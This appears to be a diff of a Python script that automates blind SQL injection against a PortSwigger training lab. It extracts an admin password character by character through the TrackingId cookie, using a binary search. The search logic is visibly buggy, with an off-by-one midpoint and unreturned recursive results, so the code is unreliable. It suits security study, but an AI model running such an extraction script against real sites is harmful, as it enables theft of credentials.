@@ -5,6 +5,17 @@ from bs4 import BeautifulSoup
 #It's already determined that the password is 20 characters long and alphanumeric through previous injection
 #This is also possible on community burp suite but it takes hours due to the number of combinations, recommend doing with pro edition
 
+def get_server_details():
+    global url
+    global trackingID
+    global session
+    #User needs to insert the URL as PortSwigger creates a new URL when starting the lab.
+    url = input("Enter Blind SQLi URL:")
+    #New Page each time means a different tracking ID
+    trackingID = input("Enter TrackingId for requests:")
+    #New page each time means a different sesesion code
+    session = input("Enter session code:")
+
 #sends a http request with sql injection
 def tracking_id_inject(payload1, payload2):
 
@@ -33,7 +44,8 @@ def tracking_id_inject(payload1, payload2):
     }
     response = requests.get(url, headers=headers)
     soup = BeautifulSoup(response.text, 'html.parser')
-    if soup.find("Welcome Back!"):
+    #print(soup)
+    if soup.find(string="Welcome back!"):
         print("True")
         return True
     else:
@@ -42,16 +54,6 @@ def tracking_id_inject(payload1, payload2):
         
 #find specific character for each of the 20 characters
 def find_password_char():
-    global url
-    global trackingID
-    global session
-    #User needs to insert the URL as PortSwigger creates a new URL when starting the lab.
-    url = input("Enter Blind SQLi URL:")
-    #New Page each time means a different tracking ID
-    trackingID = input("Enter TrackingId for requests:")
-    #New page each time means a different sesesion code
-    session = input("Enter session code:")
-    
     admin_password = ""
     alpha = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
     number = ['0','1','2','3','4','5','6','7','8','9']
@@ -65,9 +67,9 @@ def find_password_char():
     print(admin_password)
 
 def binary_search_alpha(arr, low, high, payload1):
-    mid = (low + high) // 2
+    mid = (low + high) // 2 - 1
     print(mid)
-    print(arr[mid])
+    print(type(arr[mid]))
     if tracking_id_inject(payload1, "= \'" + arr[mid]):
         return arr[mid]
     elif tracking_id_inject(payload1, "> \'" + arr[mid]):
@@ -87,11 +89,13 @@ def binary_search_number(arr, low, high, payload1):
         binary_search_number(arr, mid + 1, high, payload1)
 
 def test():
-    pass
+    tracking_id_inject("1", "= \'w")
+
 
 def main():
+    get_server_details()
     find_password_char()
-    test()
+    #test()
     
 if __name__ == "__main__":
     main()
